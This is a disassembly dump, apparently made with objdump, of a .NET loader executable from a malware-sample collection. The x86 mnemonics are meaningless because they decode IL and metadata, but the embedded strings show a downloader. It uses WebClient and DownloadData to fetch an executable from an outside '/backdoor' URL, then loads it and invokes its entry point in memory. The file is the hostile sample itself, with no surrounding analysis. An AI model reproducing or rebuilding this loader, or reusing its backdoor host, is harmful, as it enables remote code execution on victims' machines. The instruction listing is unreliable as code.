
malware_samples/loader/ef30059583a58856fe4bfee6476e0ad6402462bd10c6bb27eda202fc9cc27e92.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	d0 27                	shlb   $1,(%edi)
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 6c 21 00    	add    %al,0x216c00
  402013:	00 2c 06             	add    %ch,(%esi,%eax,1)
  402016:	00 00                	add    %al,(%eax)
  402018:	01 00                	add    %eax,(%eax)
  40201a:	00 00                	add    %al,(%eax)
  40201c:	01 00                	add    %eax,(%eax)
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	1e                   	push   %ds
  402051:	02 28                	add    (%eax),%ch
  402053:	12 00                	adc    (%eax),%al
  402055:	00 0a                	add    %cl,(%edx)
  402057:	2a 1b                	sub    (%ebx),%bl
  402059:	30 06                	xor    %al,(%esi)
  40205b:	00 eb                	add    %ch,%bl
  40205d:	00 00                	add    %al,(%eax)
  40205f:	00 01                	add    %al,(%ecx)
  402061:	00 00                	add    %al,(%eax)
  402063:	11 00                	adc    %eax,(%eax)
  402065:	72 01                	jb     0x402068
  402067:	00 00                	add    %al,(%eax)
  402069:	70 0a                	jo     0x402075
  40206b:	73 03                	jae    0x402070
  40206d:	00 00                	add    %al,(%eax)
  40206f:	0a 0c 72             	or     (%edx,%esi,2),%cl
  402072:	59                   	pop    %ecx
  402073:	00 00                	add    %al,(%eax)
  402075:	70 28                	jo     0x40209f
  402077:	04 00                	add    $0x0,%al
  402079:	00 0a                	add    %cl,(%edx)
  40207b:	08 06                	or     %al,(%esi)
  40207d:	6f                   	outsl  %ds:(%esi),(%dx)
  40207e:	05 00 00 0a 6f       	add    $0x6f0a0000,%eax
  402083:	06                   	push   %es
  402084:	00 00                	add    %al,(%eax)
  402086:	0a 0b                	or     (%ebx),%cl
  402088:	72 89                	jb     0x402013
  40208a:	00 00                	add    %al,(%eax)
  40208c:	70 07                	jo     0x402095
  40208e:	28 07                	sub    %al,(%edi)
  402090:	00 00                	add    %al,(%eax)
  402092:	0a 28                	or     (%eax),%ch
  402094:	04 00                	add    $0x0,%al
  402096:	00 0a                	add    %cl,(%edx)
  402098:	08 07                	or     %al,(%edi)
  40209a:	6f                   	outsl  %ds:(%esi),(%dx)
  40209b:	08 00                	or     %al,(%eax)
  40209d:	00 0a                	add    %cl,(%edx)
  40209f:	72 bf                	jb     0x402060
  4020a1:	00 00                	add    %al,(%eax)
  4020a3:	70 28                	jo     0x4020cd
  4020a5:	04 00                	add    $0x0,%al
  4020a7:	00 0a                	add    %cl,(%edx)
  4020a9:	28 09                	sub    %cl,(%ecx)
  4020ab:	00 00                	add    %al,(%eax)
  4020ad:	0a 6f 0a             	or     0xa(%edi),%ch
  4020b0:	00 00                	add    %al,(%eax)
  4020b2:	0a 0d 09 14 28 0b    	or     0xb281409,%cl
  4020b8:	00 00                	add    %al,(%eax)
  4020ba:	0a 2c 15 72 03 01 00 	or     0x10372(,%edx,1),%ch
  4020c1:	70 28                	jo     0x4020eb
  4020c3:	04 00                	add    $0x0,%al
  4020c5:	00 0a                	add    %cl,(%edx)
  4020c7:	72 37                	jb     0x402100
  4020c9:	01 00                	add    %eax,(%eax)
  4020cb:	70 73                	jo     0x402140
  4020cd:	0c 00                	or     $0x0,%al
  4020cf:	00 0a                	add    %cl,(%edx)
  4020d1:	7a 72                	jp     0x402145
  4020d3:	57                   	push   %edi
  4020d4:	01 00                	add    %eax,(%eax)
  4020d6:	70 28                	jo     0x402100
  4020d8:	04 00                	add    $0x0,%al
  4020da:	00 0a                	add    %cl,(%edx)
  4020dc:	09 6f 0d             	or     %ebp,0xd(%edi)
  4020df:	00 00                	add    %al,(%eax)
  4020e1:	0a 8e 2d 0b 09 14    	or     0x14090b2d(%esi),%cl
  4020e7:	14 6f                	adc    $0x6f,%al
  4020e9:	0e                   	push   %cs
  4020ea:	00 00                	add    %al,(%eax)
  4020ec:	0a 26                	or     (%esi),%ah
  4020ee:	2b 17                	sub    (%edi),%edx
  4020f0:	09 14 17             	or     %edx,(%edi,%edx,1)
  4020f3:	8d 01                	lea    (%ecx),%eax
  4020f5:	00 00                	add    %al,(%eax)
  4020f7:	01 25 16 16 8d 08    	add    %esp,0x88d1616
  4020fd:	00 00                	add    %al,(%eax)
  4020ff:	01 a2 6f 0e 00 00    	add    %esp,0xe6f(%edx)
  402105:	0a 26                	or     (%esi),%ah
  402107:	72 8d                	jb     0x402096
  402109:	01 00                	add    %eax,(%eax)
  40210b:	70 28                	jo     0x402135
  40210d:	04 00                	add    $0x0,%al
  40210f:	00 0a                	add    %cl,(%edx)
  402111:	de 3b                	fidivrs (%ebx)
  402113:	08 2c 06             	or     %ch,(%esi,%eax,1)
  402116:	08 6f 0f             	or     %ch,0xf(%edi)
  402119:	00 00                	add    %al,(%eax)
  40211b:	0a dc                	or     %ah,%bl
  40211d:	13 04 72             	adc    (%edx,%esi,2),%eax
  402120:	a1 01 00 70 11       	mov    0x11700001,%eax
  402125:	04 6f                	add    $0x6f,%al
  402127:	10 00                	adc    %al,(%eax)
  402129:	00 0a                	add    %cl,(%edx)
  40212b:	28 07                	sub    %al,(%edi)
  40212d:	00 00                	add    %al,(%eax)
  40212f:	0a 28                	or     (%eax),%ch
  402131:	04 00                	add    $0x0,%al
  402133:	00 0a                	add    %cl,(%edx)
  402135:	72 b9                	jb     0x4020f0
  402137:	01 00                	add    %eax,(%eax)
  402139:	70 28                	jo     0x402163
  40213b:	04 00                	add    $0x0,%al
  40213d:	00 0a                	add    %cl,(%edx)
  40213f:	20 88 13 00 00 28    	and    %cl,0x28000013(%eax)
  402145:	11 00                	adc    %eax,(%eax)
  402147:	00 0a                	add    %cl,(%edx)
  402149:	dd 16                	fstl   (%esi)
  40214b:	ff                   	(bad)
  40214c:	ff                   	(bad)
  40214d:	ff 2a                	ljmp   *(%edx)
  40214f:	00 01                	add    %al,(%ecx)
  402151:	1c 00                	sbb    $0x0,%al
  402153:	00 02                	add    %al,(%edx)
  402155:	00 0d 00 a2 af 00    	add    %cl,0xafa200
  40215b:	0a 00                	or     (%eax),%al
  40215d:	00 00                	add    %al,(%eax)
  40215f:	00 00                	add    %al,(%eax)
  402161:	00 01                	add    %al,(%ecx)
  402163:	00 b8 b9 00 31 06    	add    %bh,0x63100b9(%eax)
  402169:	00 00                	add    %al,(%eax)
  40216b:	01 42 53             	add    %eax,0x53(%edx)
  40216e:	4a                   	dec    %edx
  40216f:	42                   	inc    %edx
  402170:	01 00                	add    %eax,(%eax)
  402172:	01 00                	add    %eax,(%eax)
  402174:	00 00                	add    %al,(%eax)
  402176:	00 00                	add    %al,(%eax)
  402178:	0c 00                	or     $0x0,%al
  40217a:	00 00                	add    %al,(%eax)
  40217c:	76 34                	jbe    0x4021b2
  40217e:	2e 30 2e             	xor    %ch,%cs:(%esi)
  402181:	33 30                	xor    (%eax),%esi
  402183:	33 31                	xor    (%ecx),%esi
  402185:	39 00                	cmp    %eax,(%eax)
  402187:	00 00                	add    %al,(%eax)
  402189:	00 05 00 6c 00 00    	add    %al,0x6c00
  40218f:	00 84 01 00 00 23 7e 	add    %al,0x7e230000(%ecx,%eax,1)
  402196:	00 00                	add    %al,(%eax)
  402198:	f0 01 00             	lock add %eax,(%eax)
  40219b:	00 a8 01 00 00 23    	add    %ch,0x23000001(%eax)
  4021a1:	53                   	push   %ebx
  4021a2:	74 72                	je     0x402216
  4021a4:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%esi),%ebp
  4021ab:	00 98 03 00 00 f4    	add    %bl,-0xbfffffd(%eax)
  4021b1:	01 00                	add    %eax,(%eax)
  4021b3:	00 23                	add    %ah,(%ebx)
  4021b5:	55                   	push   %ebp
  4021b6:	53                   	push   %ebx
  4021b7:	00 8c 05 00 00 10 00 	add    %cl,0x100000(%ebp,%eax,1)
  4021be:	00 00                	add    %al,(%eax)
  4021c0:	23 47 55             	and    0x55(%edi),%eax
  4021c3:	49                   	dec    %ecx
  4021c4:	44                   	inc    %esp
  4021c5:	00 00                	add    %al,(%eax)
  4021c7:	00 9c 05 00 00 90 00 	add    %bl,0x900000(%ebp,%eax,1)
  4021ce:	00 00                	add    %al,(%eax)
  4021d0:	23 42 6c             	and    0x6c(%edx),%eax
  4021d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4021d4:	62 00                	bound  %eax,(%eax)
  4021d6:	00 00                	add    %al,(%eax)
  4021d8:	00 00                	add    %al,(%eax)
  4021da:	00 00                	add    %al,(%eax)
  4021dc:	02 00                	add    (%eax),%al
  4021de:	00 01                	add    %al,(%ecx)
  4021e0:	47                   	inc    %edi
  4021e1:	14 02                	adc    $0x2,%al
  4021e3:	00 09                	add    %cl,(%ecx)
  4021e5:	00 00                	add    %al,(%eax)
  4021e7:	00 00                	add    %al,(%eax)
  4021e9:	fa                   	cli
  4021ea:	25 33 00 16 00       	and    $0x160033,%eax
  4021ef:	00 01                	add    %al,(%ecx)
  4021f1:	00 00                	add    %al,(%eax)
  4021f3:	00 0d 00 00 00 02    	add    %cl,0x2000000
  4021f9:	00 00                	add    %al,(%eax)
  4021fb:	00 02                	add    %al,(%edx)
  4021fd:	00 00                	add    %al,(%eax)
  4021ff:	00 12                	add    %dl,(%edx)
  402201:	00 00                	add    %al,(%eax)
  402203:	00 02                	add    %al,(%edx)
  402205:	00 00                	add    %al,(%eax)
  402207:	00 01                	add    %al,(%ecx)
  402209:	00 00                	add    %al,(%eax)
  40220b:	00 01                	add    %al,(%ecx)
  40220d:	00 00                	add    %al,(%eax)
  40220f:	00 02                	add    %al,(%edx)
  402211:	00 00                	add    %al,(%eax)
  402213:	00 00                	add    %al,(%eax)
  402215:	00 ae 00 01 00 00    	add    %ch,0x100(%esi)
  40221b:	00 00                	add    %al,(%eax)
  40221d:	00 06                	add    %al,(%esi)
  40221f:	00 67 01             	add    %ah,0x1(%edi)
  402222:	dd 00                	fldl   (%eax)
  402224:	06                   	push   %es
  402225:	00 70 00             	add    %dh,0x0(%eax)
  402228:	32 01                	xor    (%ecx),%al
  40222a:	06                   	push   %es
  40222b:	00 90 00 32 01 0a    	add    %dl,0xa013200(%eax)
  402231:	00 79 01             	add    %bh,0x1(%ecx)
  402234:	6e                   	outsb  %ds:(%esi),(%dx)
  402235:	01 06                	add    %eax,(%esi)
  402237:	00 0d 01 f1 00 06    	add    %cl,0x600f101
  40223d:	00 03                	add    %al,(%ebx)
  40223f:	01 dd                	add    %ebx,%ebp
  402241:	00 06                	add    %al,(%esi)
  402243:	00 4b 00             	add    %cl,0x0(%ebx)
  402246:	dd 00                	fldl   (%eax)
  402248:	06                   	push   %es
  402249:	00 ce                	add    %cl,%dh
  40224b:	00 dd                	add    %bl,%ch
  40224d:	00 06                	add    %al,(%esi)
  40224f:	00 92 01 f1 00 06    	add    %dl,0x600f101(%edx)
  402255:	00 5d 00             	add    %bl,0x0(%ebp)
  402258:	f1                   	int1
  402259:	00 06                	add    %al,(%esi)
  40225b:	00 18                	add    %bl,(%eax)
  40225d:	01 f1                	add    %esi,%ecx
  40225f:	00 06                	add    %al,(%esi)
  402261:	00 3f                	add    %bh,(%edi)
  402263:	00 dd                	add    %bl,%ch
  402265:	00 06                	add    %al,(%esi)
  402267:	00 20                	add    %ah,(%eax)
  402269:	00 b5 00 00 00 00    	add    %dh,0x0(%ebp)
  40226f:	00 01                	add    %al,(%ecx)
  402271:	00 00                	add    %al,(%eax)
  402273:	00 00                	add    %al,(%eax)
  402275:	00 01                	add    %al,(%ecx)
  402277:	00 01                	add    %al,(%ecx)
  402279:	00 00                	add    %al,(%eax)
  40227b:	00 10                	add    %dl,(%eax)
  40227d:	00 d5                	add    %dl,%ch
  40227f:	00 00                	add    %al,(%eax)
  402281:	00 05 00 01 00 01    	add    %al,0x1000100
  402287:	00 58 20             	add    %bl,0x20(%eax)
  40228a:	00 00                	add    %al,(%eax)
  40228c:	00 00                	add    %al,(%eax)
  40228e:	91                   	xchg   %eax,%ecx
  40228f:	00 ec                	add    %ch,%ah
  402291:	00 0a                	add    %cl,(%edx)
  402293:	00 01                	add    %al,(%ecx)
  402295:	00 50 20             	add    %dl,0x20(%eax)
  402298:	00 00                	add    %al,(%eax)
  40229a:	00 00                	add    %al,(%eax)
  40229c:	86 18                	xchg   %bl,(%eax)
  40229e:	2c 01                	sub    $0x1,%al
  4022a0:	0e                   	push   %cs
  4022a1:	00 01                	add    %al,(%ecx)
  4022a3:	00 11                	add    %dl,(%ecx)
  4022a5:	00 2c 01             	add    %ch,(%ecx,%eax,1)
  4022a8:	12 00                	adc    (%eax),%al
  4022aa:	19 00                	sbb    %eax,(%eax)
  4022ac:	2c 01                	sub    $0x1,%al
  4022ae:	0e                   	push   %cs
  4022af:	00 21                	add    %ah,(%ecx)
  4022b1:	00 2c 01             	add    %ch,(%ecx,%eax,1)
  4022b4:	0e                   	push   %cs
  4022b5:	00 39                	add    %bh,(%ecx)
  4022b7:	00 53 00             	add    %dl,0x0(%ebx)
  4022ba:	4a                   	dec    %edx
  4022bb:	00 21                	add    %ah,(%ecx)
  4022bd:	00 c6                	add    %al,%dh
  4022bf:	00 4f 00             	add    %cl,0x0(%edi)
  4022c2:	41                   	inc    %ecx
  4022c3:	00 e4                	add    %ah,%ah
  4022c5:	00 54 00 41          	add    %dl,0x41(%eax,%eax,1)
  4022c9:	00 60 01             	add    %ah,0x1(%eax)
  4022cc:	58                   	pop    %eax
  4022cd:	00 21                	add    %ah,(%ecx)
  4022cf:	00 0a                	add    %cl,(%edx)
  4022d1:	00 5e 00             	add    %bl,0x0(%esi)
  4022d4:	49                   	dec    %ecx
  4022d5:	00 27                	add    %ah,(%edi)
  4022d7:	00 64 00 49          	add    %ah,0x49(%eax,%eax,1)
  4022db:	00 83 01 6b 00 29    	add    %al,0x29006b01(%ebx)
  4022e1:	00 9b 01 70 00 31    	add    %bl,0x31007001(%ebx)
  4022e7:	00 2c 01             	add    %ch,(%ecx,%eax,1)
  4022ea:	78 00                	js     0x4022ec
  4022ec:	51                   	push   %ecx
  4022ed:	00 52 01             	add    %dl,0x1(%edx)
  4022f0:	7d 00                	jge    0x4022f2
  4022f2:	51                   	push   %ecx
  4022f3:	00 38                	add    %bh,(%eax)
  4022f5:	00 83 00 61 00 68    	add    %al,0x68006100(%ebx)
  4022fb:	00 0e                	add    %cl,(%esi)
  4022fd:	00 31                	add    %dh,(%ecx)
  4022ff:	00 2c 00             	add    %ch,(%eax,%eax,1)
  402302:	54                   	push   %esp
  402303:	00 69 00             	add    %ch,0x0(%ecx)
  402306:	26 01 8a 00 09 00 2c 	add    %ecx,%es:0x2c000900(%edx)
  40230d:	01 0e                	add    %ecx,(%esi)
  40230f:	00 2e                	add    %ch,(%esi)
  402311:	00 0b                	add    %cl,(%ebx)
  402313:	00 17                	add    %dl,(%edi)
  402315:	00 2e                	add    %ch,(%esi)
  402317:	00 13                	add    %dl,(%ebx)
  402319:	00 20                	add    %ah,(%eax)
  40231b:	00 3f                	add    %bh,(%edi)
  40231d:	00 04 80             	add    %al,(%eax,%eax,4)
	...
  402330:	e9 00 00 00 04       	jmp    0x4402335
	...
  40233d:	00 00                	add    %al,(%eax)
  40233f:	00 01                	add    %al,(%ecx)
  402341:	00 17                	add    %dl,(%edi)
  402343:	00 00                	add    %al,(%eax)
  402345:	00 00                	add    %al,(%eax)
  402347:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  402352:	00 00                	add    %al,(%eax)
  402354:	01 00                	add    %eax,(%eax)
  402356:	dd 00                	fldl   (%eax)
  402358:	00 00                	add    %al,(%eax)
  40235a:	00 00                	add    %al,(%eax)
  40235c:	00 3c 4d 6f 64 75 6c 	add    %bh,0x6c75646f(,%ecx,2)
  402363:	65 3e 00 44 6f 77    	gs add %al,%ds:0x77(%edi,%ebp,2)
  402369:	6e                   	outsb  %ds:(%esi),(%dx)
  40236a:	6c                   	insb   (%dx),%es:(%edi)
  40236b:	6f                   	outsl  %ds:(%esi),(%dx)
  40236c:	61                   	popa
  40236d:	64 44                	fs inc %esp
  40236f:	61                   	popa
  402370:	74 61                	je     0x4023d3
  402372:	00 6d 73             	add    %ch,0x73(%ebp)
  402375:	63 6f 72             	arpl   %ebp,0x72(%edi)
  402378:	6c                   	insb   (%dx),%es:(%edi)
  402379:	69 62 00 54 68 72 65 	imul   $0x65726854,0x0(%edx),%esp
  402380:	61                   	popa
  402381:	64 00 4c 6f 61       	add    %cl,%fs:0x61(%edi,%ebp,2)
  402386:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  40238a:	74 5f                	je     0x4023eb
  40238c:	4d                   	dec    %ebp
  40238d:	65 73 73             	gs jae 0x402403
  402390:	61                   	popa
  402391:	67 65 00 49 6e       	add    %cl,%gs:0x6e(%bx,%di)
  402396:	76 6f                	jbe    0x402407
  402398:	6b 65 00 49          	imul   $0x49,0x0(%ebp),%esp
  40239c:	44                   	inc    %esp
  40239d:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  4023a4:	6c                   	insb   (%dx),%es:(%edi)
  4023a5:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  4023a9:	6e                   	outsb  %ds:(%esi),(%dx)
  4023aa:	73 6f                	jae    0x40241b
  4023ac:	6c                   	insb   (%dx),%es:(%edi)
  4023ad:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  4023b1:	69 74 65 4c 69 6e 65 	imul   $0x656e69,0x4c(%ebp,%eiz,2),%esi
  4023b8:	00 
  4023b9:	4d                   	dec    %ebp
  4023ba:	65 74 68             	gs je  0x402425
  4023bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4023be:	64 42                	fs inc %edx
  4023c0:	61                   	popa
  4023c1:	73 65                	jae    0x402428
  4023c3:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  4023c7:	70 6f                	jo     0x402438
  4023c9:	73 65                	jae    0x402430
  4023cb:	00 43 6f             	add    %al,0x6f(%ebx)
  4023ce:	6d                   	insl   (%dx),%es:(%edi)
  4023cf:	70 69                	jo     0x40243a
  4023d1:	6c                   	insb   (%dx),%es:(%edi)
  4023d2:	61                   	popa
  4023d3:	74 69                	je     0x40243e
  4023d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4023d6:	6e                   	outsb  %ds:(%esi),(%dx)
  4023d7:	52                   	push   %edx
  4023d8:	65 6c                	gs insb (%dx),%es:(%edi)
  4023da:	61                   	popa
  4023db:	78 61                	js     0x40243e
  4023dd:	74 69                	je     0x402448
  4023df:	6f                   	outsl  %ds:(%esi),(%dx)
  4023e0:	6e                   	outsb  %ds:(%esi),(%dx)
  4023e1:	73 41                	jae    0x402424
  4023e3:	74 74                	je     0x402459
  4023e5:	72 69                	jb     0x402450
  4023e7:	62 75 74             	bound  %esi,0x74(%ebp)
  4023ea:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  4023ee:	6e                   	outsb  %ds:(%esi),(%dx)
  4023ef:	74 69                	je     0x40245a
  4023f1:	6d                   	insl   (%dx),%es:(%edi)
  4023f2:	65 43                	gs inc %ebx
  4023f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4023f5:	6d                   	insl   (%dx),%es:(%edi)
  4023f6:	70 61                	jo     0x402459
  4023f8:	74 69                	je     0x402463
  4023fa:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  4023fd:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  402404:	69 
  402405:	62 75 74             	bound  %esi,0x74(%ebp)
  402408:	65 00 6d 6d          	add    %ch,%gs:0x6d(%ebp)
  40240c:	2e 65 78 65          	cs js,pn 0x402475
  402410:	00 53 79             	add    %dl,0x79(%ebx)
  402413:	73 74                	jae    0x402489
  402415:	65 6d                	gs insl (%dx),%es:(%edi)
  402417:	2e 54                	cs push %esp
  402419:	68 72 65 61 64       	push   $0x64616572
  40241e:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
  402425:	6e                   	outsb  %ds:(%esi),(%dx)
  402426:	6c                   	insb   (%dx),%es:(%edi)
  402427:	6f                   	outsl  %ds:(%esi),(%dx)
  402428:	61                   	popa
  402429:	64 53                	fs push %ebx
  40242b:	74 72                	je     0x40249f
  40242d:	69 6e 67 00 50 72 6f 	imul   $0x6f725000,0x67(%esi),%ebp
  402434:	67 72 61             	addr16 jb 0x402498
  402437:	6d                   	insl   (%dx),%es:(%edi)
  402438:	00 53 79             	add    %dl,0x79(%ebx)
  40243b:	73 74                	jae    0x4024b1
  40243d:	65 6d                	gs insl (%dx),%es:(%edi)
  40243f:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  402443:	6d                   	insl   (%dx),%es:(%edi)
  402444:	00 6d 6d             	add    %ch,0x6d(%ebp)
  402447:	00 4d 61             	add    %cl,0x61(%ebp)
  40244a:	69 6e 00 53 79 73 74 	imul   $0x74737953,0x0(%esi),%ebp
  402451:	65 6d                	gs insl (%dx),%es:(%edi)
  402453:	2e 52                	cs push %edx
  402455:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  402458:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40245d:	6e                   	outsb  %ds:(%esi),(%dx)
  40245e:	00 45 78             	add    %al,0x78(%ebp)
  402461:	63 65 70             	arpl   %esp,0x70(%ebp)
  402464:	74 69                	je     0x4024cf
  402466:	6f                   	outsl  %ds:(%esi),(%dx)
  402467:	6e                   	outsb  %ds:(%esi),(%dx)
  402468:	00 4d 65             	add    %cl,0x65(%ebp)
  40246b:	74 68                	je     0x4024d5
  40246d:	6f                   	outsl  %ds:(%esi),(%dx)
  40246e:	64 49                	fs dec %ecx
  402470:	6e                   	outsb  %ds:(%esi),(%dx)
  402471:	66 6f                	outsw  %ds:(%esi),(%dx)
  402473:	00 50 61             	add    %dl,0x61(%eax)
  402476:	72 61                	jb     0x4024d9
  402478:	6d                   	insl   (%dx),%es:(%edi)
  402479:	65 74 65             	gs je  0x4024e1
  40247c:	72 49                	jb     0x4024c7
  40247e:	6e                   	outsb  %ds:(%esi),(%dx)
  40247f:	66 6f                	outsw  %ds:(%esi),(%dx)
  402481:	00 53 6c             	add    %dl,0x6c(%ebx)
  402484:	65 65 70 00          	gs gs jo 0x402488
  402488:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  40248d:	00 53 79             	add    %dl,0x79(%ebx)
  402490:	73 74                	jae    0x402506
  402492:	65 6d                	gs insl (%dx),%es:(%edi)
  402494:	2e 52                	cs push %edx
  402496:	75 6e                	jne    0x402506
  402498:	74 69                	je     0x402503
  40249a:	6d                   	insl   (%dx),%es:(%edi)
  40249b:	65 2e 43             	gs cs inc %ebx
  40249e:	6f                   	outsl  %ds:(%esi),(%dx)
  40249f:	6d                   	insl   (%dx),%es:(%edi)
  4024a0:	70 69                	jo     0x40250b
  4024a2:	6c                   	insb   (%dx),%es:(%edi)
  4024a3:	65 72 53             	gs jb  0x4024f9
  4024a6:	65 72 76             	gs jb  0x40251f
  4024a9:	69 63 65 73 00 47 65 	imul   $0x65470073,0x65(%ebx),%esp
  4024b0:	74 50                	je     0x402502
  4024b2:	61                   	popa
  4024b3:	72 61                	jb     0x402516
  4024b5:	6d                   	insl   (%dx),%es:(%edi)
  4024b6:	65 74 65             	gs je  0x40251e
  4024b9:	72 73                	jb     0x40252e
  4024bb:	00 43 6f             	add    %al,0x6f(%ebx)
  4024be:	6e                   	outsb  %ds:(%esi),(%dx)
  4024bf:	63 61 74             	arpl   %esp,0x74(%ecx)
  4024c2:	00 4f 62             	add    %cl,0x62(%edi)
  4024c5:	6a 65                	push   $0x65
  4024c7:	63 74 00 53          	arpl   %esi,0x53(%eax,%eax,1)
  4024cb:	79 73                	jns    0x402540
  4024cd:	74 65                	je     0x402534
  4024cf:	6d                   	insl   (%dx),%es:(%edi)
  4024d0:	2e 4e                	cs dec %esi
  4024d2:	65 74 00             	gs je  0x4024d5
  4024d5:	57                   	push   %edi
  4024d6:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  4024da:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  4024e1:	74 5f                	je     0x402542
  4024e3:	45                   	inc    %ebp
  4024e4:	6e                   	outsb  %ds:(%esi),(%dx)
  4024e5:	74 72                	je     0x402559
  4024e7:	79 50                	jns    0x402539
  4024e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4024ea:	69 6e 74 00 41 73 73 	imul   $0x73734100,0x74(%esi),%ebp
  4024f1:	65 6d                	gs insl (%dx),%es:(%edi)
  4024f3:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  4024f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4024f8:	70 5f                	jo     0x402559
  4024fa:	45                   	inc    %ebp
  4024fb:	71 75                	jno    0x402572
  4024fd:	61                   	popa
  4024fe:	6c                   	insb   (%dx),%es:(%edi)
  4024ff:	69 74 79 00 00 00 57 	imul   $0x68570000,0x0(%ecx,%edi,2),%esi
  402506:	68 
  402507:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  40250b:	00 70 00             	add    %dh,0x0(%eax)
  40250e:	73 00                	jae    0x402510
  402510:	3a 00                	cmp    (%eax),%al
  402512:	2f                   	das
  402513:	00 2f                	add    %ch,(%edi)
  402515:	00 68 00             	add    %ch,0x0(%eax)
  402518:	61                   	popa
  402519:	00 69 00             	add    %ch,0x0(%ecx)
  40251c:	31 00                	xor    %eax,(%eax)
  40251e:	37                   	aaa
  40251f:	00 32                	add    %dh,(%edx)
  402521:	00 33                	add    %dh,(%ebx)
  402523:	00 2e                	add    %ch,(%esi)
  402525:	00 70 00             	add    %dh,0x0(%eax)
  402528:	79 00                	jns    0x40252a
  40252a:	74 00                	je     0x40252c
  40252c:	68 00 6f 00 6e       	push   $0x6e006f00
  402531:	00 61 00             	add    %ah,0x0(%ecx)
  402534:	6e                   	outsb  %ds:(%esi),(%dx)
  402535:	00 79 00             	add    %bh,0x0(%ecx)
  402538:	77 00                	ja     0x40253a
  40253a:	68 00 65 00 72       	push   $0x72006500
  40253f:	00 65 00             	add    %ah,0x0(%ebp)
  402542:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  402546:	6f                   	outsl  %ds:(%esi),(%dx)
  402547:	00 6d 00             	add    %ch,0x0(%ebp)
  40254a:	2f                   	das
  40254b:	00 62 00             	add    %ah,0x0(%edx)
  40254e:	61                   	popa
  40254f:	00 63 00             	add    %ah,0x0(%ebx)
  402552:	6b 00 64             	imul   $0x64,(%eax),%eax
  402555:	00 6f 00             	add    %ch,0x0(%edi)
  402558:	6f                   	outsl  %ds:(%esi),(%dx)
  402559:	00 72 00             	add    %dh,0x0(%edx)
  40255c:	00 2f                	add    %ch,(%edi)
  40255e:	5b                   	pop    %ebx
  40255f:	00 2a                	add    %ch,(%edx)
  402561:	00 5d 00             	add    %bl,0x0(%ebp)
  402564:	20 00                	and    %al,(%eax)
  402566:	46                   	inc    %esi
  402567:	00 65 00             	add    %ah,0x0(%ebp)
  40256a:	74 00                	je     0x40256c
  40256c:	63 00                	arpl   %eax,(%eax)
  40256e:	68 00 69 00 6e       	push   $0x6e006900
  402573:	00 67 00             	add    %ah,0x0(%edi)
  402576:	20 00                	and    %al,(%eax)
  402578:	45                   	inc    %ebp
  402579:	00 58 00             	add    %bl,0x0(%eax)
  40257c:	45                   	inc    %ebp
  40257d:	00 20                	add    %ah,(%eax)
  40257f:	00 55 00             	add    %dl,0x0(%ebp)
  402582:	52                   	push   %edx
  402583:	00 4c 00 2e          	add    %cl,0x2e(%eax,%eax,1)
  402587:	00 2e                	add    %ch,(%esi)
  402589:	00 2e                	add    %ch,(%esi)
  40258b:	00 00                	add    %al,(%eax)
  40258d:	35 5b 00 2a 00       	xor    $0x2a005b,%eax
  402592:	5d                   	pop    %ebp
  402593:	00 20                	add    %ah,(%eax)
  402595:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  402599:	00 77 00             	add    %dh,0x0(%edi)
  40259c:	6e                   	outsb  %ds:(%esi),(%dx)
  40259d:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  4025a1:	00 61 00             	add    %ah,0x0(%ecx)
  4025a4:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  4025a8:	6e                   	outsb  %ds:(%esi),(%dx)
  4025a9:	00 67 00             	add    %ah,0x0(%edi)
  4025ac:	20 00                	and    %al,(%eax)
  4025ae:	45                   	inc    %ebp
  4025af:	00 58 00             	add    %bl,0x0(%eax)
  4025b2:	45                   	inc    %ebp
  4025b3:	00 20                	add    %ah,(%eax)
  4025b5:	00 66 00             	add    %ah,0x0(%esi)
  4025b8:	72 00                	jb     0x4025ba
  4025ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4025bb:	00 6d 00             	add    %ch,0x0(%ebp)
  4025be:	3a 00                	cmp    (%eax),%al
  4025c0:	20 00                	and    %al,(%eax)
  4025c2:	00 43 5b             	add    %al,0x5b(%ebx)
  4025c5:	00 2a                	add    %ch,(%edx)
  4025c7:	00 5d 00             	add    %bl,0x0(%ebp)
  4025ca:	20 00                	and    %al,(%eax)
  4025cc:	4c                   	dec    %esp
  4025cd:	00 6f 00             	add    %ch,0x0(%edi)
  4025d0:	61                   	popa
  4025d1:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  4025d5:	00 6e 00             	add    %ch,0x0(%esi)
  4025d8:	67 00 20             	add    %ah,(%bx,%si)
